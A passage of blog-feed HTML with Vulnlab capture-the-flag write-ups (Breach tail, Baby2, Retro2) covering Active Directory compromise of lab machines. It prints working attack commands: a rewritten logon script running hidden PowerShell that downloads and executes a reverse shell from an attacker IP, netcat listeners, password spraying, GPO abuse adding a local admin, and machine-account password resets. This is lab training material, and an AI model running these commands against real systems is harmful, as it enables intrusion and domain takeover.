Net.WebClient).DownloadString(&#x27;http://10.8.5.195:8080/maybe.ps1&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>We modified our maybe.ps1 script and set up a listener:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><p><img src="/images/Breach/admin.png" alt="Admin Shell"></p><p><a href="https://api.vulnlab.com/api/v1/share?id=c3140301-21e1-4913-99b2-b635726c0e21">https://api.vulnlab.com/api/v1/share?id=c3140301-21e1-4913-99b2-b635726c0e21</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Baby2</title>
      <link href="/2025/03/15/VL-Baby2/"/>
      <url>/2025/03/15/VL-Baby2/</url>
      
        <content type="html"><![CDATA[<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-14 23:10:17Z)</span><br><span class="line">135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp  open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">|_ssl-date: 2025-03-14T23:11:42+00:00; -2h00m00s from scanner time.</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: BABY2</span><br><span class="line">|   NetBIOS_Domain_Name: BABY2</span><br><span class="line">|   NetBIOS_Computer_Name: DC</span><br><span class="line">|   DNS_Domain_Name: baby2.vl</span><br><span class="line">|   DNS_Computer_Name: dc.baby2.vl</span><br><span class="line">|   DNS_Tree_Name: baby2.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-03-14T23:11:01+00:00</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: -2h00m00s, deviation: 0s, median: -2h00m00s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-03-14T23:11:04</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure><h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><h3 id="Shares"><a href="#Shares" class="headerlink" title="Shares"></a>Shares</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.89.250 -u &#x27;guest&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Baby2/shares-acess.png" alt="shares-acess"></p><h4 id="NETLOGON"><a href="#NETLOGON" class="headerlink" title="NETLOGON"></a>NETLOGON</h4><p>Looking into the <code>Netlogon</code> share we find a <code>login.vbs</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient  //10.10.89.250/NETLOGON -U &#x27;guest&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Baby2/netlogon.png" alt="netlogon"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Sub MapNetworkShare(sharePath, driveLetter)</span><br><span class="line">    Dim objNetwork</span><br><span class="line">    Set objNetwork = CreateObject(&quot;WScript.Network&quot;)    </span><br><span class="line">  </span><br><span class="line">    &#x27; Check if the drive is already mapped</span><br><span class="line">    Dim mappedDrives</span><br><span class="line">    Set mappedDrives = objNetwork.EnumNetworkDrives</span><br><span class="line">    Dim isMapped</span><br><span class="line">    isMapped = False</span><br><span class="line">    For i = 0 To mappedDrives.Count - 1 Step 2</span><br><span class="line">        If UCase(mappedDrives.Item(i)) = UCase(driveLetter &amp; &quot;:&quot;) Then</span><br><span class="line">            isMapped = True</span><br><span class="line">            Exit For</span><br><span class="line">        End If</span><br><span class="line">    Next</span><br><span class="line">    </span><br><span class="line">    If isMapped Then</span><br><span class="line">        objNetwork.RemoveNetworkDrive driveLetter &amp; &quot;:&quot;, True, True</span><br><span class="line">    End If</span><br><span class="line">    </span><br><span class="line">    objNetwork.MapNetworkDrive driveLetter &amp; &quot;:&quot;, sharePath</span><br><span class="line">    </span><br><span class="line">    If Err.Number = 0 Then</span><br><span class="line">        WScript.Echo &quot;Mapped &quot; &amp; driveLetter &amp; &quot;: to &quot; &amp; sharePath</span><br><span class="line">    Else</span><br><span class="line">        WScript.Echo &quot;Failed to map &quot; &amp; driveLetter &amp; &quot;: &quot; &amp; Err.Description</span><br><span class="line">    End If</span><br><span class="line">    </span><br><span class="line">    Set objNetwork = Nothing</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">MapNetworkShare &quot;\\dc.baby2.vl\apps&quot;, &quot;V&quot;</span><br><span class="line">MapNetworkShare &quot;\\dc.baby2.vl\docs&quot;, &quot;L&quot;</span><br></pre></td></tr></table></figure><h4 id="Apps"><a href="#Apps" class="headerlink" title="Apps"></a>Apps</h4><p>On the <code>Apps</code> share we find a changelog and a .lnk file pointing into the <code>/SYSVOL/scripts/ login.vbs</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient  //10.10.89.250/apps -U &#x27;guest&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Baby2/apps-share.png" alt="apps-share"></p><p>CHANGELOG:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[0.2]</span><br><span class="line"></span><br><span class="line">- Added automated drive mapping</span><br><span class="line"></span><br><span class="line">[0.1]</span><br><span class="line"></span><br><span class="line">- Rolled out initial version of the domain logon script      </span><br></pre></td></tr></table></figure><h4 id="Home"><a href="#Home" class="headerlink" title="Home"></a>Home</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.89.250/homes -U &#x27;guest&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Baby2/home-share.png" alt="home-share"><br>Possible Usernames:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Amelia.Griffiths</span><br><span class="line">Carl.Moore</span><br><span class="line">Harry.Shaw</span><br><span class="line">Joan.Jennings</span><br><span class="line">Joel.Hurst</span><br><span class="line">Kieran.Mitchell</span><br><span class="line">library</span><br><span class="line">Lynda.Bailey</span><br><span class="line">Mohammed.Harris</span><br><span class="line">Nicola.Lamb</span><br><span class="line">Ryan.Jenkins</span><br></pre></td></tr></table></figure><p>Also we can find all of the usernames using <code>lookupsid</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-lookupsid guest@10.10.89.250 -no-pass</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1000: BABY2\DC$ (SidTypeUser)</span><br><span class="line">1101: BABY2\DnsAdmins (SidTypeAlias)</span><br><span class="line">1102: BABY2\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">1103: BABY2\gpoadm (SidTypeUser)</span><br><span class="line">1104: BABY2\office (SidTypeGroup)</span><br><span class="line">1105: BABY2\Joan.Jennings (SidTypeUser)</span><br><span class="line">1106: BABY2\Mohammed.Harris (SidTypeUser)</span><br><span class="line">1107: BABY2\Harry.Shaw (SidTypeUser)</span><br><span class="line">1108: BABY2\Carl.Moore (SidTypeUser)</span><br><span class="line">1109: BABY2\Ryan.Jenkins (SidTypeUser)</span><br><span class="line">1110: BABY2\Kieran.Mitchell (SidTypeUser)</span><br><span class="line">1111: BABY2\Nicola.Lamb (SidTypeUser)</span><br><span class="line">1112: BABY2\Lynda.Bailey (SidTypeUser)</span><br><span class="line">1113: BABY2\Joel.Hurst (SidTypeUser)</span><br><span class="line">1114: BABY2\Amelia.Griffiths (SidTypeUser)</span><br><span class="line">1602: BABY2\library (SidTypeUser)</span><br><span class="line">2601: BABY2\legacy (SidTypeGroup)</span><br></pre></td></tr></table></figure><h3 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h3><p>After some password spraying we can see that the user <code>library</code> and <code>Carl.Moore</code> have the same password as their usernames and now we get more access to the shares</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.109.97 -u usernames.txt  -p usernames.txt --no-bruteforce --continue-on-success</span><br></pre></td></tr></table></figure><p><img src="/images/Baby2/smb-users-access.png" alt="smb-users-access"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.109.97 -u &quot;Carl.Moore&quot; -p &quot;Carl.Moore&quot; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Baby2/carl.more-shares.png" alt="carl.more-shares"><br>We got <code>Read</code> on <code>SYSVOL</code> also now we can <code>READ</code> and <code>WRITE</code> on home, docs, and app share!</p><h4 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h4><p>Also now we have ldap access so we will run <code>bloodhound-python</code> or <code>netexec</code> to get a view of the domain.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.89.250 -u &#x27;library&#x27; -p &#x27;library&#x27;  --bloodhound --dns-server 10.10.89.250 -c All --dns-tcp</span><br></pre></td></tr></table></figure><p><img src="/images/Baby2/possible-path.png" alt="possible-path"></p><h4 id="LOGIN-VBS"><a href="#LOGIN-VBS" class="headerlink" title="LOGIN.VBS"></a>LOGIN.VBS</h4><p>We will be changing the login.vbs script to the one below so we can get a shell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.109.97/SYSVOL -U &#x27;Carl.Moore&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get login.vbs</span><br></pre></td></tr></table></figure><p>Now we change the login.vbs to:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set oShell = CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">oShell.Run(&quot;powershell.exe -nop -w hidden -ep bypass -c IEX(IWR http://10.8.5.195:8080/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.8.5.195 3001&quot;)</span><br></pre></td></tr></table></figure><p><strong>Here is the ps1 shell I use:</strong> <a href="https://github.com/antonioCoco/ConPtyShell">https://github.com/antonioCoco/ConPtyShell</a></p><p>And start our listener and wait for someone to login</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -echo; (stty size; cat) | nc -lvnp 3001</span><br></pre></td></tr></table></figure><h2 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h2><h3 id="Shell-as-Amelia-Griffiths"><a href="#Shell-as-Amelia-Griffiths" class="headerlink" title="Shell as Amelia.Griffiths"></a>Shell as Amelia.Griffiths</h3><p><img src="/images/Baby2/shell-amelina.png" alt="shell-amelina"></p><p>We noticed that Amelia was part of the legacy group. Earlier we identified that the legacy group has <code>WriteDacl</code> over the <code>GPOADM</code> user. Following the bloodhound walkthrough, first we give the legacy group <code>GenericAll</code> permission over <code>GPOADM</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;GPOADM&quot; -PrincipalIdentity legacy -Domain baby2.vl -Rights All -Verbose</span><br></pre></td></tr></table></figure><p><img src="/images/Baby2/genericall.png" alt="genericall"><br>Now that we have <code>GenericAll</code> we changed the password of the <code>GPOADM</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$UserPassword = ConvertTo-SecureString &#x27;Password123!&#x27; -AsPlainText -Force</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainUserPassword -Identity &quot;GPOADM&quot; -AccountPassword $UserPassword</span><br></pre></td></tr></table></figure><h3 id="GPO-Abuse"><a href="#GPO-Abuse" class="headerlink" title="GPO Abuse"></a>GPO Abuse</h3><p>As we saw earlier, <code>GPOADM</code> has <code>GenericAll</code> over the <code>Default Domain Policy</code> so we will use a tool named <code>pyGPOAbuse</code> to help us exploit it. <a href="https://github.com/Hackndo/pyGPOAbuse">https://github.com/Hackndo/pyGPOAbuse</a></p><p>We grab the GPO-ID and then we will run the python file that creates a user.<br><img src="/images/Baby2/gpo-id.png" alt="gpo-id"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 pygpoabuse.py &#x27;baby2.vl/gpoadm:Password123!&#x27; -gpo-id &#x27;6AC1786C-016F-11D2-945F-00C04FB984F9&#x27; -f</span><br></pre></td></tr></table></figure><p>After running the command we need to <code>gpupdate</code> so the changes get applied</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure><p>And we will see a new user that we created <code>john:H4x00r123..</code> in the local administrators group:<br><img src="/images/Baby2/john-user.png" alt="john-user"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.109.97 -u &#x27;john&#x27; -p &#x27;H4x00r123..&#x27;</span><br></pre></td></tr></table></figure><p><a href="https://api.vulnlab.com/api/v1/share?id=762ae368-a3d3-42da-810c-4f17964e01fb" title="https://api.vulnlab.com/api/v1/share?id=762ae368-a3d3-42da-810c-4f17964e01fb">https://api.vulnlab.com/api/v1/share?id=762ae368-a3d3-42da-810c-4f17964e01fb</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Retro2</title>
      <link href="/2025/03/14/VL-Retro2/"/>
      <url>/2025/03/14/VL-Retro2/</url>
      
        <content type="html"><![CDATA[<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE      REASON          VERSION</span><br><span class="line">53/tcp    open  domain       syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15F75)</span><br><span class="line">88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos </span><br><span class="line">135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)</span><br><span class="line">464/tcp   open  kpasswd5?    syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped   syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped   syn-ack ttl 127</span><br><span class="line">49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49157/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-03-11T18:29:27</span><br><span class="line">|_  start_date: 2025-03-11T18:27:35</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2:1:0: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| p2p-conficker: </span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 22122/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 47750/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 39335/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 23565/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1</span><br><span class="line">|   Computer name: BLN01</span><br><span class="line">|   NetBIOS computer name: BLN01\x00</span><br><span class="line">|   Domain name: retro2.vl</span><br><span class="line">|   Forest name: retro2.vl</span><br><span class="line">|   FQDN: BLN01.retro2.vl</span><br><span class="line">|_  System time: 2025-03-11T19:29:28+01:00</span><br><span class="line">|_clock-skew: mean: -2h19m57s, deviation: 34m36s, median: -1h59m59s</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)</p><h2 id="Fast-exploit"><a href="#Fast-exploit" class="headerlink" title="Fast exploit"></a>Fast exploit</h2><p>We can see that its Windows Server 2008 R2 trying the most basic exploits for this version we see that its vulnerable to <code>nopac</code> and <code>zerologon</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb BLN01.retro2.vl -M zerologon</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb BLN01.retro2.vl -u &quot;user&quot; -p &quot;pass&quot; -M nopac</span><br></pre></td></tr></table></figure><p>There are plenty tutorials for how to use <code>zerologon</code> and the <code>nopac</code> exploits this blog post will focus on the “intended way”</p><h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.100.199 -u &#x27;guest&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Retro2/guest0smb2.png" alt="guest0smb2"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.100.199/Public -U &#x27;guest&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Retro2/public-shares.png" alt="public-shares"><br>There is one file in the DB folder named <code>staff.accdb</code> we will download that file to our system</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get staff.accdb</span><br></pre></td></tr></table></figure><p>The <code>.accdb</code> is a is an <em>Access 2007&#x2F;2010 Database file</em> used in and opened by Access 2007+, we can use office2john to get the hash and crack it as its password protected</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">office2john staff.accdb</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --format=office --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></pre></td></tr></table></figure><p><img src="/images/Retro2/john-crack.png" alt="john-crack"><br>Using the password <code>class08</code>, we unlock the microsoft access database:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapreader:&lt;REDACTED&gt;</span><br></pre></td></tr></table></figure><h3 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -u &quot;ldapreader&quot; -p &quot;&lt;REDACTED&gt;&quot; -d retro2.vl -dc BLN01.retro2.vl -ns 10.10.70.92 -c ALL --zip</span><br></pre></td></tr></table></figure><p>OR</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc ldap retro2.vl -u &#x27;ldapreader&#x27; -p &#x27;&lt;REDACTED&gt;&#x27; --bloodhound --dns-server &lt;ip&gt; -c All --dns-tcp</span><br></pre></td></tr></table></figure><p>The above command will get us a zip file that we will use on bloodhound and find our exploitation path<br><img src="/images/Retro2/bloodhound.png" alt="bloodhound"></p><h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><p>First we will try to use the username as the password lowercase for the machine account <code>fs01$</code>(Refer to this blog post that describes why this happens <a href="https://www.xmco.fr/en/active-directory-en/part-5-machine-accounts-in-the-active-directory/">https://www.xmco.fr/en/active-directory-en/part-5-machine-accounts-in-the-active-directory/</a>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb retro2.vl -u &#x27;fs01$&#x27; -p &#x27;fs01&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Retro2/fs01-account.png" alt="fs01-account"><br>we need to change the password so we can use that machine account with the password</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-changepasswd &#x27;retro2.vl/fs01$&#x27;:&#x27;fs01&#x27;@retro2.vl -newpass StrongP@ss1234 -dc-ip BLN01.retro2.vl -p rpc-samr</span><br></pre></td></tr></table></figure><h4 id="GenericWrite"><a href="#GenericWrite" class="headerlink" title="GenericWrite"></a>GenericWrite</h4><p>We have control over FS01, we can take advantage of the <strong>GenericWrite</strong> permission we previously identified. Typically, this permission can be abused using one of the following techniques:</p><ul><li><strong>Shadow Credentials</strong> (applicable to Windows Server 2016 and later)</li><li><strong>Targeted Kerberoasting</strong> (only effective if the target’s password is weak and crackable)</li><li><strong>Resource-Based Constrained Delegation</strong></li></ul><p>As we are dealing with a Windows Server 2008 none of them will work so we will use another way we can modify another attribute <strong>unicodePwd</strong> which allows us to reset the password for <strong>“ADMWS01$”</strong> (Big thanks to serotonin for this exploitation path <a href="https://seriotonctf.github.io/2024/08/25/Retro2-Vulnlab/">https://seriotonctf.github.io/2024/08/25/Retro2-Vulnlab/</a> )</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net rpc password &#x27;ADMWS01$&#x27; Passw0rd1 -U retro2.vl/&#x27;fs01$&#x27;%StrongP@ss1234 -S BLN01.retro2.vl</span><br></pre></td></tr></table></figure><h4 id="AddMember"><a href="#AddMember" class="headerlink" title="AddMember"></a>AddMember</h4><p>We will add the user we own <code>ldapreader</code> to the group <code>Services</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net rpc group addmem &quot;Services&quot; &quot;ldapreader&quot; -U &quot;retro2.vl&quot;/&quot;ADMWS01$&quot;%&quot;Passw0rd1&quot; -S BLN01.retro2.vl</span><br></pre></td></tr></table></figure><p>Then we can just RDP to the machine:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:10.10.70.92 /u:&#x27;ldapreader&#x27; /p:&#x27;&lt;REDACTED&gt;&#x27; /d:retro2.vl /tls-seclevel:0</span><br></pre></td></tr></table></figure><h2 id="Priv-Escalation"><a href="#Priv-Escalation" class="headerlink" title="Priv Escalation"></a>Priv Escalation</h2><p>There is a great blog post by <a href="https://itm4n.github.io/">itm4n</a> on a no-fix vulnerability<br>    <a href="https://itm4n.github.io/windows-registry-rpceptmapper-eop/">https://itm4n.github.io/windows-registry-rpceptmapper-eop/</a><br>    <a href="https://itm4n.github.io/windows-registry-rpceptmapper-exploit/">https://itm4n.github.io/windows-registry-rpceptmapper-exploit/</a></p><p>Now with a tool named <a href="https://github.com/itm4n/Perfusion">Perfusion</a> we can get a system shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Perfusion.exe -c cmd 